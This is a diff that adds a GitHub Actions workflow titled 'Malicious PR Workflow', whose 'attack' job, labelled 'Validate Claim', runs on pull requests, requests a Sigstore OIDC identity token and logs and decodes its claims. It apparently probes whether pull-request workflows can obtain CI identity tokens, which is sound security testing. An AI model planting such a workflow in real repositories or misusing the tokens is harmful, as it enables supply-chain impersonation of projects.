@@ -1,0 +1,39 @@
+name: Malicious PR Workflow
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  attack:
+    name: Validate Claim
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+    
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+    
+      - name: Get and Display OIDC Token
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = await core.getIDToken('sigstore');
+            
+            // Token will be masked automatically
+            console.log('Full Token:', token);
+            
+            // Decode and display claims
+            const [header, payload, signature] = token.split('.');
+            const decodedPayload = JSON.parse(
+              Buffer.from(payload, 'base64').toString('utf-8')
+            );
+            
+            console.log('Token Claims:', JSON.stringify(decodedPayload, null, 2));
